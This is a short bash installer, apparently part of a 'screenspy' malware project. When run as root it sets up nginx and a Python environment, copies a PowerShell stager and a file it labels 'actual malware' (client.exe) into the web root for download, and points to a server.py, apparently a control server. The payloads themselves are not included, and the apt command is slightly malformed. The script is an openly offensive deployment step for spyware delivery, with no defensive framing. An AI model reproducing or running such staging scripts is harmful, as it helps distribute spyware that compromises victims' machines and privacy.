#!/bin/bash

if [ "$EUID" -eq 0 ]; then
    
    echo "Installing required packages"
    apt install nginx, python3, python3-venv
    
    echo "Installing pip packages"
    python3 -m venv venv
    source venv/bin/activate
    pip3 install -r requirements.txt


    echo "Copying stager script into webroot"
    cp stager.ps1 /var/www/html
    echo "Sucessfully copied"

    echo "Copying actual malware into webroot"
    cp client.exe /var/www/html
    echo "Sucessfully copied"

    echo "Copying nginx config"
    cp nginx.conf /etc/nginx/conf.d/screenspy.conf
    echo "Successfully copied"

    echo "Everything is done restarting webserver"
    systemctl restart nginx

    echo "~~~ READY run: python3 server.py"

else
    echo "Please run script with \"sudo\" commnad"
fi



